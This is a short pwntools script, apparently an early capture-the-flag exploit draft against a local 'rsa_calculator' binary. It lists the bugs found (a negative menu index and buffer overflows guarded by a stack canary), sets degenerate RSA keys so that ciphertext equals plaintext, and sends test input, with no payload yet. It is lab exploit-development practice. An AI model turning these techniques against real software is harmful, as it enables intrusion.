from pwn import *

context.log_level = "debug"

"""
Exploit plan
<Bug list>
    select menu input> -1, 0
    RSA_encrypt-sprintf> BOF but CANARY
    RSA_decrypt-memcpy> BOF but CANARY
<set key>
p = 1, q = 256, e = 1, d = 1 >>>  this makes 'Plain = Encrypted = Decrypted'
"""


def rsa_encrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]


def rsa_decrypt(txt):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b": ")
    p.sendline(b"1024")
    p.recvline()
    p.sendline(txt)
    p.recvline()
    return p.recvuntil(b"-")[:-3]



p = process("/root/Downloads/rsa_calculator")

# 1. set key pair, p=1, q=256, e=1, d=1
key_pair = [b"1", b"256", b"1", b"1"]
p.recvuntil(b"> ")
p.sendline(b"1")
for i in range(4):
    p.recvuntil(b": ")
    p.sendline(key_pair[i])

# 2. rsa_encrypt
plain = b"A" * 8
enc = rsa_encrypt(plain)

# 3. rsa_decrypt
dec = rsa_decrypt(enc)

print("plain: ", plain)
print("enc: ", enc)
print("dec: ", dec)
